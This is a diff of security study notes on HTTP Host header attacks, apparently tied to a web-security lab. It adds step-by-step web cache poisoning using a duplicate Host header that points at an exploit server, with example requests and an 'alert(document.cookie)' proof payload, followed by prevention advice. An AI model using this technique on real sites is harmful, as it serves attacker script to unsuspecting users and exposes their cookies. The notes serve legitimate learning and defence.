@@ -25,18 +25,37 @@ If we can change Host: header to any value and still successfully access the hom
 3.) In Burp change Host: header to localhost  
 > Host: localhost  
 
-### Web cache poisoning via ambiguous requests
-To reduce latency cache sits between the back-end server and the user where it saves (caches) the responses to particular requests, usually for a fixed amount of time. If another user sends equivalent request, cache simply serves a copy of the cached response w/o interfering with back-end server. Caches identify  requests by comparing "cache key" (subset of request components). 
-* Typically: request line and Host header. Components of the request that are not included in the cache key are said to be "unkeyed".  
-* If the cache key of an incoming request matches the key of a previous request cache server will serve a copy of the cached response 
-* Other components of the request are ignored!  
-
-Any web cache poisoning attack relies on manipulation of unkeyed inputs, such as headers  
-
-1.) Identifying unkeyed inputs that are supported by the server - Burp Comparer to compare the response with and without the injected input or Param Miner Burp extension (When test for unkeyed inputs on a live website, there is a risk of inadvertently causing the cache to serve your generated responses to real users. Therefore, it is important to make sure that your requests all have a unique cache key so that they will only be served to you.)
+### Web cache poisoning via Host: header
+To reduce latency cache sits between the back-end server and the user where it saves (caches) the responses to particular requests, usually for a fixed amount of time. If another user sends equivalent request, cache simply serves a copy of the cached response w/o interfering with back-end server.
+If an input is reflected in the response from the server without being properly sanitized, or is used to dynamically generate other data, then this is a potential entry point for web cache poisoning. Next step is to make cache server to save our malicious request! 
 
 
 
+Standalone caches typically include the Host header in the cache key, so this approach usually works best on integrated, application-level caches. That said, the techniques discussed earlier can sometimes enable you to poison even standalone web caches.
+
+
+1.) GET request response with Cache header, also tampering with Host: header doesnt load website.
+> Cache-Control: max-age=30  
+> X-Cache: miss  
+
+2.) Identifying unkeyed inputs that server supports with Burp Comparer or Param Miner (on live website, risk is that cache might serve our generated responses to real users, therefore make sure that our requests all have a unique cache key so that they will only be served to you.). Host: header is parameter in this case.  
+3.) Add second Host: header and send 
+>Host: test.test.com   
+
+Response contains our test code in: "<script type="text/javascript" src="//test.test2.com/resources/js/tracking.js"></script>" and X-Cache: miss, send again till get X-Cache: hit, means its saved in cache for 30sec!:
+> X-Cache: miss  
+> EX-Cache: hit  
+
+4.) Create malicious domain where store your exploit.
+Back in Burp Repeater, add a second Host header containing your exploit server domain name. The request should look something like this:
+
+> GET /?cb=123 HTTP/1.1  # "?cb=123" is random, used as unique cache key that we know 
+> Host: realwebsite.net  
+> Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net  
+
+
+/resources/js/tracking.js
+alert(document.cookie)
 
 
 
@@ -44,12 +63,26 @@ Any web cache poisoning attack relies on manipulation of unkeyed inputs, such as
 
 
 
+----------------------
+How to prevent HTTP Host header attacks
+To prevent HTTP Host header attacks, the simplest approach is to avoid using the Host header altogether in server-side code. Double-check whether each URL really needs to be absolute. You will often find that you can just use a relative URL instead. This simple change can help you prevent web cache poisoning vulnerabilities in particular.
 
+Other ways to prevent HTTP Host header attacks include:
 
+Protect absolute URLs
+When you have to use absolute URLs, you should require the current domain to be manually specified in a configuration file and refer to this value instead of the Host header. This approach would eliminate the threat of password reset poisoning, for example.
 
+Validate the Host header
+If you must use the Host header, make sure you validate it properly. This should involve checking it against a whitelist of permitted domains and rejecting or redirecting any requests for unrecognized hosts. You should consult the documentation of your framework for guidance on how to do this. For example, the Django framework provides the ALLOWED_HOSTS option in the settings file. This approach will reduce your exposure to Host header injection attacks.
 
+Don't support Host override headers
+It is also important to check that you do not support additional headers that may be used to construct these attacks, in particular X-Forwarded-Host. Remember that these may be supported by default.
 
+Whitelist permitted domains
+To prevent routing-based attacks on internal infrastructure, you should configure your load balancer or any reverse proxies to forward requests only to a whitelist of permitted domains.
 
+Be careful with internal-only virtual hosts
+When using virtual hosting, you should avoid hosting internal-only websites and applications on the same server as public-facing content. Otherwise, attackers may be able to access internal domains via Host header manipulation.
 
 
 
